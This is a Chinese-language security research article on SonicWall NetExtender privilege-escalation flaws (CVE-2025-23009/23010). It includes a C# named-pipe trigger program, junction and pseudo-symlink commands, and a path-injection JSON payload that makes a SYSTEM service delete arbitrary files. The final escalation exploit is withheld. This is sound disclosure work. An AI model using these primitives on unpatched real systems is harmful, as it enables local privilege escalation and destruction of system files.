#  企业级VPN NetExtender任意文件删除到权限提升漏洞剖析  
原创 メ念灬蜘蛛  山石网科安全技术研究院   2025-06-13 07:40  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**看似普通的文件删除漏洞，实则暗藏提升权限的‘机关’，SonicWall NetExtender的这些漏洞是如何被一步步攻破的？**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在网络安全的世界里，每一次漏洞的发现都是一场与时间赛跑的较量。在近期一次基于主机的渗透测试中，网络安全公司NetSPI于广受欢迎的企业级VPN客户端——适用于Windows系统的SonicWall NetExtender中，发现了多个可导致任意系统文件删除的漏洞。在本篇文章里，我们将详述这些漏洞的发现过程，以及如何利用它们实现本地权限提升。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、摘要**  
  
****  
  
- NetSPI发现，NetExtender存在多个可被利用来进行权限提升的任意系统文件删除漏洞，这些漏洞已被追踪编号为CVE-2025-23009。  
  
- NetSPI发现了一个可被用于实施拒绝服务攻击的任意系统文件覆盖漏洞，其追踪编号为CVE-2025-23010。  
  
- SonicWall已在适用于Windows系统的NetExtender最新版本（10.3.2）中修复了这些漏洞。  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、初始侦查**  
  
****  
  
在一次预定的客户端渗透测试（针对运行定制版Windows 11 24H2系统的主机）开始前几天，漏洞发现流程便已启动。对目标系统上的软件和服务进行初步排查后发现，该定制系统环境相对纯净——与Windows 11默认安装版本相比，其安装的软件数量极少，且系统加固措施更为完善。  
  
  
值得注意的是，目标系统中安装了SonicWall NetExtender 10.3.1版本VPN客户端。其旧版本（10.3.0）曾存在一个现已修复的本地权限提升漏洞（CVE-2025-23007），该漏洞由毕马威马德里分公司的Eduardo Pérez-Malumbres Cervera报告。NetSPI团队试图追溯该问题的根源，并对该软件进行深度审计，以排查是否存在其他类似漏洞——这些漏洞可能被用于在目标系统上实现权限提升。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、对非公开漏洞进行逆向工程**  
  
****  
  
此前针对该漏洞并未公开可用的概念验证（PoC）攻击代码。然而，通过厂商发布的安全公告以及Eduardo公开的概念验证演示视频，我们得以推断出以下信息：  
- 该漏洞是NetExtender服务（NEService.exe）存在的任意系统文件读取漏洞。  
  
- 漏洞与“Log Export”功能相关。  
  
- 漏洞可通过命名管道（Named Pipe）触发，无需与NetExtender用户界面（UI）进行交互。  
  
基于上述信息，NetSPI团队在测试系统中安装了NetExtender 10.3.0版本，并打开了NetExtender用户界面（NetExtender.exe）。此外，团队启动了 SysInternals工具集的“Procmon”（进程监视器），并设置过滤规则，仅捕获与NEService.exe或NetExtender.exe相关的成功文件读取操作。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZzfCIANDpvdBZ1lBJF7artIwRKqm2hVZoOBPamia49H99OuibfmaucSSQ/640?wx_fmt=png&from=appmsg "")  
  
  
在配置好相应的事件过滤规则后，测试人员点击了用户界面中的“导出日志”按钮。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZdWVY98zVpp0RdvBqeAvS2EjLe2LYrcVqp1F1TkJ38V8CAqbIuib476Q/640?wx_fmt=png&from=appmsg "")  
  
  
操作结果显示，以SYSTEM权限运行的NEService.exe进程会查询目录C:\ProgramData\SonicWall\NetExtender下的文件和子目录。该目录及其子目录中识别出的所有文件均会被读取、复制并压缩成一个文件，存储至用户的“下载”文件夹中。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZ5ibqwJlib1nRWiaicNokRSsIJSwPqibsq2URnNsvDdkvMkX36pP994vkEEA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZ1lRiadT4Rnibz9U3oykp6bZ8GYnyrV6NAAJn272aOR4icMJLZf62lrtFA/640?wx_fmt=png&from=appmsg "")  
  
  
基于观察到的行为可以合理推测：若能找到一种控制初始文件读取的方法，攻击者就有可能将任意目录和文件的内容复制到低权限用户可读取的位置。通常，文件系统操作的操纵可通过符号链接（Symbolic Links）实现，但NTFS符号链接默认仅允许管理员通过SeCreateSymbolicLinkPrivilege权限创建。不过，这一限制可通过利用NTFS连接点（Junctions）绕过——从高层逻辑看，NTFS连接点类似文件夹级别的快捷方式，可透明地将对某个文件夹的文件访问重定向到另一个文件夹。  
  
  
谷歌“零项目”（Project Zero）的詹姆斯・福肖（James Forshaw）发布的CreateMountPoint工具可用于创建此类连接点。在以下示例中，该工具被用于在C:\ProgramData\SonicWall\NetExtender与C:\Windows\System32\drivers\etc之间创建一个连接点。  
  
```
.\CreateMountPoint.exe C:\ProgramData\SonicWall\NetExtender\ C:\Windows\System32\drivers\etc\ 
```  
  
  
在运行ProcMon的情况下，测试人员再次点击“导出日志”按钮，并监控了NEService.exe执行的文件操作。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZHxlPrqsxianPtDyFz4rV61AelQaeucd3ex6C5JLs5IVvScazicw8rSxA/640?wx_fmt=png&from=appmsg "")  
  
  
NetSPI观察到，NEService.exe进程会透明地跟随NTFS连接点跳转，进而读取*C:\Windows\System32\drivers\etc*目录下的所有文件。随后，该目录下的全部文件会被压缩并复制到用户的“下载”文件夹中，而低权限用户可直接访问该文件夹内的内容。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZcdKMolL8zBuScuOxoCByeUXE4A5eFYFp3mUzpEQmBb0GRLJib2JC3jw/640?wx_fmt=png&from=appmsg "")  
  
  
至此，NetSPI已确认了Eduardo所报告的漏洞，并证明了通过操纵NEService.exe执行的文件操作可实现任意文件访问。而剩下的关键问题是：需弄清楚Eduardo究竟是如何通过命名管道触发该漏洞的。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、在没有GUI的情况下触发漏洞**  
  
****  
由于该功能可通过用户界面触发，因此我们首先从这里入手进行搜索。幸运的是，NetExtender.exe是一个.NET应用程序，因此可以使用诸如dnSpyEx之类的工具轻松进行反编译。  
  
  
在查看可用类时，我们发现了以下与易受攻击的日志导出功能相关的方法。在此方法中，我们可以看到GenerateExportLogsMsg()被调用，并附带了一个指向用户下载文件夹并添加了时间戳的路径。  
  
```
private void exportLogsButton_ccMouseUpEvent(object sender, EventArgs e) {     NETraceLogs.Write(NETraceLogs.LogLevel.Debug, NETraceLogs.FormType.NELogs, "Export logs button clicked");     DateTime now = DateTime.Now;     string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads\\NetExtender-" + now.ToString("yyyyMMddHHmmss");     this.m_vpnMsgHandler.GenerateExportLogsMsg(path, NECommonUtil.GUI_DEBUG_PATH_STR).SendVpnMessage(3000);     this.exportLogsButton.buttonEvent = false;     this.exportLogsButton.buttonText = Localization.Exporting;     this.m_folderPath = Path.GetDirectoryName(path);     this.isExportingLog = true;     MainForm.ShowPendingBar(); } 
```  
  
  
在GenerateExportLogsMsg()方法内部，我们看到一个JSON对象jobject的构造过程：它基于此前传入的路径（用户下载文件夹路径+时间戳），并结合了另一个参数GUI_DEBUG_PATH_STR（在本例中该参数为空字符串）。随后，程序会实例化一个VpnMessage对象——在构造函数中，除了将我们的jobject传递给FormatJsonData()方法外，还会同时指定消息类型为exportLogs，并最终返回该对象。  
  
```
public VpnMessage GenerateExportLogsMsg(string path, string guiLog) {     JObject jobject = new JObject();     jobject.Add("path", path);     jobject.Add("guiLog", guiLog);     return new VpnMessage(this.FormatJsonData(MessageCallBackData.MessageTypeToString[MessageCallBackData.MessageType.exportLogs], jobject), MessageCallBackData.MessageType.exportLogs); } 
```  
  
  
在FormatJsonData()方法内部，我们可以看到一个新的JSON对象被创建。这个对象是通过将我们传入的jobject与额外的action和source字符串进行拼接而生成的。  
  
```
public string FormatJsonData(string action, JObject data = null) {     JObject jobject = new JObject();     jobject.Add("action", action);     jobject.Add("source", Pipe.GetPipeName());     if (data != null) {         jobject.Add("data", data);     }     return jobject.ToString(); } 
```  
  
  
此方法返回并传递给VpnMessage构造函数的最终JSON对象如下所示：  
  
```
{   "action": "exportLogs",   "source": "\\\\.\\pipe\\NEPipeStClient",   "data": {     "path": "C:\\users\\lowpriv\\Downloads\NetExtender-20250403154755",      "guiLog": ""   } } 
```  
  
  
值得注意的是，source值取自NetExtender.Pipe类：  
  
```
public static string DEF_LIST_VPN_PIPE_NAME = "NEPipeStClient";public static string DEF_SEND_VPN_PIPE_NAME = "NEPipeSMAVpnPipe"; 
```  
  
  
在实例化VpnMessage对象后，会调用其SendVpnMessage()方法。该方法会将我们刚刚构建的JSON对象和exportLogs消息类型传递给SendJsonStr()方法。  
  
```
public bool SendVpnMessage(int timeout = 3000) {     return MessageHandler.Instance.SendJsonStr(this.m_jsonData, this.m_type, timeout); } 
```  
  
  
最后，SendJsonStr()方法会将我们的JSON对象、exportLogs消息类型以及一个超时时间传递给VpnSendMessageOnPipe()方法。  
  
```
public bool SendJsonStr(string JSON, MessageCallBackData.MessageType msgType, int timeout) {     MessageHandler.m_sendMessageMutex.WaitOne();     bool result = Pipe.VpnSendMessageOnPipe(JSON, msgType, timeout);     MessageHandler.m_sendMessageMutex.ReleaseMutex();     return result; } 
```  
  
  
从高层逻辑来看，VpnSendMessageOnPipe()方法会连接到由NEService.exe暴露的命名管道NEPipeSMAVpnPipe，并将我们的JSON对象传入其中。  
  
```
public static bool VpnSendMessageOnPipe(string JSONStr, MessageCallBackData.MessageType msgType, int timeout) {     bool result = false;     try {         NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", Pipe.DEF_SEND_VPN_PIPE_NAME, PipeDirection.Out);         namedPipeClientStream.Connect(timeout);         using(StreamWriter streamWriter = new StreamWriter(namedPipeClientStream, Encoding.Default, 4096)) {             streamWriter.AutoFlush = true;             streamWriter.Write(JSONStr);         }         namedPipeClientStream.Close();         if (msgType != MessageCallBackData.MessageType.queryStatus && msgType != MessageCallBackData.MessageType.queryLogs) {             Pipe.m_lastMsgType = msgType;             NETraceLogs.Write(NETraceLogs.LogLevel.Debug, NETraceLogs.FormType.NEUnknown, string.Format("SendMsg:{0}", Pipe.m_lastMsgType.ToString()));         }         result = true;     } catch (Exception ex) {         Console.WriteLine("Failed to write to the VPN Service pipe: " + ex.ToString());     }     return result; } 
```  
  
  
最终，我们可以将所有环节整合起来，通过编程方式触发exportLogs功能，而无需依赖NetExtender的用户界面。以下是为此编写的C[#代码]()  
：  
  
```
using System; using System.IO; using System.IO.Pipes; using Newtonsoft.Json.Linq; using Newtonsoft.Json; using System.Text; classProgram{     static void Main(string[] args)    {         string action = "exportLogs";          string source = "\\\\.\\pipe\\NEPipeStClient";         string path = "C:\\users\\lowpriv\\Downloads\\foo";         string guiLog = "";         JObject dataObject = new JObject         {             { "path", path },             { "guiLog", guiLog }         };         JObject finalJson = new JObject         {             { "action", action },             { "source", source },             { "data", dataObject }         };         string jsonString = finalJson.ToString(Formatting.Indented);         Console.WriteLine("[*] Attempting to exportLogs via NEPipeSMAVpnPipe.");         Console.WriteLine("[*] Sending JSON: ");         Console.WriteLine(jsonString);                 if (SendPayloadToVPNPipe(finalJson.ToString(Formatting.None), 3000))         {             Console.WriteLine("[+] Successfully called exportLogs via NEPipeSMAVpnPipe.");         }         else        {             Console.WriteLine("[!] Failed to call exportLogs via NEPipeSMAVpnPipe.");         }     }     public static bool SendPayloadToVPNPipe(string JSONStr, int timeout)    {         bool result = false;         try        {             NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", "NEPipeSMAVpnPipe", PipeDirection.Out);             namedPipeClientStream.Connect(timeout);             using (StreamWriter streamWriter = new StreamWriter(namedPipeClientStream, Encoding.Default, 4096))             {                 streamWriter.AutoFlush = true;                 streamWriter.Write(JSONStr);             }             namedPipeClientStream.Close();             result = true;         }         catch (Exception ex)         {             Console.WriteLine("Failed to write to the VPN Service pipe: " + ex.ToString());         }         return result;     } } 
```  
  
  
编译并执行代码后，我们观察到日志已成功导出并写入我们指定的路径：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZYEgV0swCTCUGQlUmSpwOeYLKvepc2gflPWANdYmGjnvg8qbuTmWC7A/640?wx_fmt=png&from=appmsg "")  
  
  
要复现Eduardo的完整漏洞利用，最后一步是将上述代码与我们之前执行的连接点攻击相结合。不过，此步骤留给读者作为练习。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**五、识别更多漏洞**  
  
****  
  
现在我们已经了解了之前发现的漏洞，接下来可以在目标软件版本中寻找其他潜在的安全隐患。由于该漏洞与不安全的文件操作相关，我们将重点关注触发文件操作的方法。在运行ProcMon的情况下，通过NetExtender用户界面点击各种功能，我们观察到了几个由以SYSTEM权限运行的NEService.exe对用户可修改文件执行删除操作的情况。  
  
  
每次通过NEPipeSMAVpnPipe调用clearCapturedPacket操作时，都会删除文件C:\ProgramData\SonicWall\Net Extender\Nxpcap_tmp.pcap。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZblLicWpOykuEqodKuUp9ics7lEyVd6BNqBrB1EUM4AX3VJXZZgBOzYRg/640?wx_fmt=png&from=appmsg "")  
  
  
我们还注意到，每次通过NEPipeSMAVpnPipe调用saveProperties操作时，文件C:\ProgramData\SonicWall\NxCredentialProvider\prelogon.v2.disabled都会被删除。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZJ32XpdybDwmMTUnicFxqXqZiaqSUN6TM1IeSGln3DIkanicUvoUTwhOfA/640?wx_fmt=png&from=appmsg "")  
  
  
此外，NetSPI还发现了一种利用路径注入漏洞实现任意文件删除的方法。当通过命名管道NEPipeSMAVpnPipe触发saveCapturedPacket操作时，攻击者可在JSON对象中注入自定义路径，诱使以SYSTEM权限运行的NEService.exe删除任意文件。  
  
  
实现这一攻击的JSON对象示例如下：  
  
```
{   "action": "saveCapturedPacket",   "source": "\\\\.\\pipe\\NEPipeStClient",   "data": {     "path": "C:\\Windows\\System32\\config\\hello.txt"   } } 
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZHlovm2J7RQkiaKWz6L7djqhSbU4VV36kLmTcPqtjGUjpG49ZJdw6PNg/640?wx_fmt=png&from=appmsg "")  
  
  
前两种SYSTEM权限文件删除原语可通过NTFS连接点（Junctions）和Windows对象管理器符号链接（Object Manager Symbolic Links）来利用。如本文前面所述，NTFS连接点类似于文件夹级别的快捷方式，可透明地将文件访问从一个文件夹重定向到另一个文件夹。而Windows对象管理器中的符号链接则是一种内部快捷方式，可指向文件、设备或资源。如果用户对源文件拥有写入权限，则可以将这两种技术结合起来，创建伪符号链接（pseudo-symlink），从而将文件操作重定向到任意位置。  
  
  
谷歌Project Zero的James Forshaw发布的CreateSymlink工具能够创建这种伪符号链接。在下面的示例中，该工具用于在C:\ProgramData\SonicWall\NxCredentialProvider\prelogon.v2.disabled和C:\Windows\System32\drivers\etc\hosts之间创建一个伪符号链接：  
  
```
CreateSymlink.exe C:\ProgramData\SonicWall\NxCredentialProvider\prelogon.v2.disabled C:\windows\System32\drivers\etc\hosts Opened Link \RPC Control\prelogon.v2.disabled -> \??\C:\windows\System32\drivers\etc\hosts: 00000140 Press ENTER to exit and delete the symlink 
```  
  
  
在配置好伪符号链接后，我们通过调用  
saveProperties  
操作触发删除请求，并使用  
ProcMon  
监控系统行为，观察到：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZ5ib8ic8kVlP0ic6gCqtrIUcLUUWUy0HeKibPlJiap3VXRibooVgoqTFZS8ibw/640?wx_fmt=png&from=appmsg "")  
  
  
我们可以看到，系统跟随了这个伪符号链接，随后删除了文件C:\Windows\System32\drivers\etc\hosts。这表明我们已成功利用该漏洞，以SYSTEM权限执行了任意文件删除操作。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**六、提升权限**  
  
****  
  
以SYSTEM权限删除任意文件的漏洞看似影响有限（通常仅能导致拒绝服务），但安全研究员Abdelhamid Naceri在2021年和2023年发表的技术表明，可通过操纵MSI安装包的回滚文件（rollback files），将文件删除漏洞转化为稳定的本地权限提升（LPE）。  
  
  
这些技术的详细原理超出了本文范围，建议阅读Zero Day Initiative的优秀文章：《Abusing Arbitrary File Deletes to Escalate Privilege and Other Great Tricks》。  
  
  
基于上述任意文件删除原语，NetSPI成功开发了三种不同的稳定本地权限提升漏洞利用方法：  
- 通过clearCapturedPacket操作实现权限提升  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZyxk4aeOtPIDkOZgsX8XMIbzc07gDVrWpxzdEeiaseZms3jfiac9ugAQQ/640?wx_fmt=png&from=appmsg "")  
  
- 通过saveCapturedPacket操作实现权限提升  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZhnqhLe8j1qoM2iaHbuh9kccCZbChhic8xicldKcbRibJh07zeHY24pe5bQ/640?wx_fmt=png&from=appmsg "")  
  
- 通过saveProperties操作实现权限提升  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZIDpMzicwsF05uE9nviarmFpbITSGcFrYbJh0ick1QoEZr9zpVIpZ5ZG7Q/640?wx_fmt=png&from=appmsg "")  
  
  
需要注意的是，攻击性的漏洞利用代码不会在此提供，相关实现将留给读者作为练习。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**七、建议**  
  
****  
  
**SonicWall NetExtender for Windows的版本应更新到10.3.2（2025年4月9日发布），该版本解决了文章中强调的问题。**  
  
****  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请560多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及  
基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、安全服务、安全教育等九大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
